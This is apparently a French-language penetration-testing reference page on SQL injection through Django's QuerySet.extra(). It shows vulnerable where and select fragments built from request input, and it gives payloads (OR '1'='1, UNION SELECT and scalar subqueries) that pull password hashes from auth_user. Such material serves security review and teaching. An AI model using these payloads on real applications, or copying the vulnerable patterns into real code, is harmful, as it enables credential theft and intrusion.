---
title: "Injection extra() Django : clauses select, where et order_by construites à partir de l'entrée"
description: QuerySet.extra() insère des fragments SQL bruts dans select, where, tables et order_by, lorsque ces fragments portent de l'entrée utilisateur le résultat est une injection SQL.
keywords:
  - ORM Django
  - injection extra()
  - select_extra
  - where_extra
  - injection order_by
  - injection SQL
---

# Injection extra()

`QuerySet.extra()` est une API Django héritée qui injecte des **fragments SQL bruts** dans des parties spécifiques d'une requête : `select=`, `where=`, `tables=`, `order_by=` et `params=`. Chaque fragment est concaténé dans l'instruction finale, donc tout fragment construit à partir d'une entrée non fiable est un point d'injection SQL. La documentation même de Django avertit qu'`extra()` est difficile à utiliser en toute sécurité ; en revue offensive, c'est un endroit fiable pour trouver de l'injection.

## Schémas vulnérables

**Fragment `where`**, le point d'injection le plus direct :

```python
# q from the request
Entry.objects.extra(where=[f"headline LIKE '%{q}%'"])
```

**Fragment `select`**, l'attaquant contrôle une expression projetée :

```python
Entry.objects.extra(select={"val": f"({user_expr})"})
```

**`order_by`**, accepte des noms de champ ou d'alias, que Django résout et met entre guillemets via le compilateur de requêtes (un point d'injection plus faible que les fragments bruts ci-dessus) :

```python
Entry.objects.extra(order_by=[request.GET["sort"]])
```

## Exploitation

**L'injection `where`** se comporte comme une injection dans une clause `WHERE`. Fermez la chaîne/parenthèse et ajoutez de la logique ou une sous-requête :

```
%' OR '1'='1
%' UNION SELECT password FROM auth_user --
title',(SELECT password FROM auth_user LIMIT 1) AS stolen--
```

**L'injection `select`** vous permet de projeter une sous-requête scalaire arbitraire dans une colonne que la vue rend ensuite :

```
(SELECT password FROM auth_user WHERE is_superuser=true LIMIT 1)
```

**`order_by` n'est pas un point d'injection SQL brut.** Contrairement à `select`/`where`, `extra(order_by=[...])` résout chaque entrée comme un nom de champ ou d'alias et le met entre guillemets via le compilateur, donc une expression arbitraire telle qu'une charge utile `CASE` lève une erreur de résolution de champ plutôt que de s'exécuter. Traitez-le au mieux comme un faible oracle d'ordonnancement sur les colonnes existantes ; `QuerySet.order_by()` est validé de la même manière. Pour l'injection brute, visez les fragments `select` et `where`, ceux-ci insèrent votre texte directement dans le SQL, ce qui fait d'`extra()` une cible de grande valeur.

## Outils

- **sqlmap** : automatiser l'extraction contre les fragments select et where d'extra().
- **Burp Repeater et Intruder** : délivrer des charges utiles d'évasion et de sous-requête aux fragments.

## Références

- [Documentation Django : extra()](https://docs.djangoproject.com/en/stable/ref/models/querysets/#extra)
- [PayloadsAllTheThings : SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
